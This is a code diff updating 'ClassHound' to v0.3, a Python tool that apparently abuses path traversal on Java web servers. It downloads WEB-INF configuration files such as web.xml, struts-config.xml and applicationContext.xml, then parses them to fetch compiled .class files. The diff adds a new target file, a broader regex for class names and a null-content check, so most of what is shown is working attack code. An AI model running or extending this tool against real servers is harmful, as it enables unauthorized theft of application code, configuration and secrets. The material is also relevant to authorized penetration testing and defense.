@@ -81,7 +81,7 @@ def download_and_save_file(travel_file_path, auto_change_count=False):
     change_travel_path(travel_file_path)
     _status_code, _content = request()
 
-    if _status_code == normal_status_code and keyword not in str(_content):
+    if _content and _status_code == normal_status_code and keyword not in str(_content):
         try:
             save_file(own_dir, travel_file_path, _content)
             sys.stdout.write('\r[+] Download: [{}] ok{}'.format(travel_file_path, ' ' * 10))
@@ -100,7 +100,7 @@ def download_and_save_file(travel_file_path, auto_change_count=False):
             travel_char_count = r
             change_travel_path(travel_file_path)
             _status_code, _content = request()
-            if _status_code == normal_status_code and keyword not in _content:
+            if _content and _status_code == normal_status_code and keyword not in _content:
                 try:
                     save_file(own_dir, travel_file_path, _content)
                     sys.stdout.write('\r[+] Download: [{}] ok !'.format(travel_file_path))
@@ -209,7 +209,7 @@ if __name__ == '__main__':
                   ,,,,,     o' \,=./ `o    |.===.    
                  /(o o)\       (o o)       {}o o{}   
               ooO--(_)--OooooO--(_)--OooooO--(_)--Ooo        
-                                                            ClassHound v0.2\n
+                                                            ClassHound v0.3\n
 ''')
     try:
         current_dir = os.path.dirname(os.path.join(os.path.abspath(sys.argv[0]))).encode('utf-8').decode()
@@ -380,6 +380,7 @@ if __name__ == '__main__':
 
     init_travel_files = [
         'WEB-INF/web.xml',
+        'WEB-INF/struts-config.xml',
         'WEB-INF/applicationContext.xml',
         'WEB-INF/classes/applicationContext.xml',
     ]
@@ -390,7 +391,7 @@ if __name__ == '__main__':
             else:
                 change_url_data(travel_char * x + travel_file)
             try_status_code, try_content = request()
-            if try_status_code == normal_status_code and keyword not in str(try_content):
+            if try_content and try_status_code == normal_status_code and keyword not in str(try_content):
                 travel_char_count = x if travel_char_count == 0 else travel_char_count
                 save_file(own_dir, travel_file, try_content)
                 print('[+] Download: [{}] success!  Travel Char: [{}]  Count: [{}]'.format(travel_file, travel_char, travel_char_count))
@@ -428,12 +429,16 @@ if __name__ == '__main__':
 
             print("\n[+] Starting download [.class] files parsing from [.xml] files ...")
             # 提取 xml 文件中 class 地址并下载到本地
+            class_pattern = '<.*?class>(.*?)</.*?class>|class="(.*?)"|type="(.*?)"'
             for fp in walk_file_paths(own_dir):
                 if fp.endswith('.xml'):
-                    m = re.findall('<.*?class>(.*?)</.*?class>|class="(.*?)"', io.open(fp, 'r', encoding="utf-8").read(), re.I | re.M | re.S)
+                    try:
+                        m = re.findall(class_pattern, io.open(fp, 'r', encoding="utf-8").read(), re.I | re.M | re.S)
+                    except Exception as e:
+                        m = re.findall(class_pattern, io.open(fp, 'r').read(), re.I | re.M | re.S)
                     if m:
                         for _m in m:
-                            p = _m[0] if _m[0] else _m[1]
+                            p = _m[0] if _m[0] else (_m[1] if _m[1] else _m[2])
                             class_url_path = '/WEB-INF/classes/' + p.replace(".", "/").strip() + '.class'
                             allow_download = True
                             for x in do_not_download_classes:
